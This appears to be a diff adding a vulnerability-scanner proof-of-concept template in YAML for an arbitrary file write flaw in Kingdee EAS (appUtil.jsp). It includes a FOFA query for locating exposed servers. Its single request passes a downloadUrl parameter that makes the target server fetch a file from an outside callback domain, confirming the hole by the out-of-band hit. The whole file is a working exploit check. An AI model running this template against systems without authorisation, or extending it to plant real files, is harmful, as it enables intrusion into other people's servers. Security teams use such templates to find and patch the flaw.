@@ -1,0 +1,18 @@
+id: poc-yaml-kingdee-eas-apputil-downloadurl-upload
+info:
+  name: 金蝶EAS appUtil.jsp downloadUrl 任意文件写入漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 任意写入
+  finger: 金蝶 EAS
+  fofa: app="Kingdee-EAS"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /easportal/tools/appUtil.jsp?downloadUrl=http://{{.reverseDomain}}/1.zip&type=1
+  expression: "status_code == 200 && \nreverse.Verify()\n"
+transport: http
